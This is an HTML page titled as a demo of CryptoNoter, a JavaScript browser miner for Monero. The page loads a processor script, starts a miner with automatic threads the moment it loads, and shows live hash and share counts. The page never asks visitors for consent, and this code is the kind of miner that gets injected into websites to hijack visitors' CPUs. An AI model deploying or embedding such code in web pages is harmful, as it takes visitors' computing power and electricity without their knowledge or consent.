<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>CryptoNoter - Javascript Browser XMR Mining Script</title>
    <style>
        th {
            width: 180px;
        }
    </style>
    <script src="/processor.js"></script>
    <script>
        var addr = 'CryptoNoter';
        var miner = new CryptoNoter.Anonymous(addr, {
            autoThreads: true,
            throttle: 0.1
        });
        miner.start();

        // Listen on events
        miner.on('error', function (...data) {
            console.log('error',data)
        })

        miner.on('changeData', function (data) {
            document.getElementById("TotalHashes").innerHTML = data.totalHashes;
            document.getElementById("VerifiedShares").innerHTML =  data.sharesVerfied;
            document.getElementById("FoundShares").innerHTML = data.sharesFound;
            document.getElementById("Hashes").innerHTML = data.hashRate;
        })
    </script>
</head>

<body>

<table width='930' cellpadding= '5' cellspacing='0'style='margin:0px;font-size:14px;' />
<tr>
    <td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <b>Hash Rate / Sec</b>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <b>Total Hashes</b>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <b>Shares Found</b>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <b>Shares Verfied</b>
    </td>
</tr>
<tr>
    <td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <div id="Hashes">0</div>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <div id="TotalHashes">0</div>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <div id="FoundShares">0</div>
    </td>
    <td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
        <div id="VerifiedShares">0</div>
    </td>
</tr>
</table>
</body>
</html>
